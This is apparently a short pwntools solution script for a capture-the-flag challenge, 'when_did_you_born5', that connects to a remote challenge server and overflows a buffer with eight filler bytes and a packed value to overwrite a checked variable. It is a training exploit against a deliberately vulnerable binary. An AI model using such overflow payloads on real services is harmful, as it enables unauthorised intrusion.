from pwn import *
# from LibcSearcher import *
# p = process("./when_did_you_born5")
p = remote("111.198.29.45",40073)
context.log_level = 'debug'
# context.terminal = ['tmux','splitw','-h']

elf = ELF("./when_did_you_born5")
# obj = LibcSearcher("",)

# gdb.attach(p)
payload1 = "1999"
p.sendline(payload1)

payload2 = 'a'*8 + p32(0x786)
p.sendline(payload2)

p.interactive()
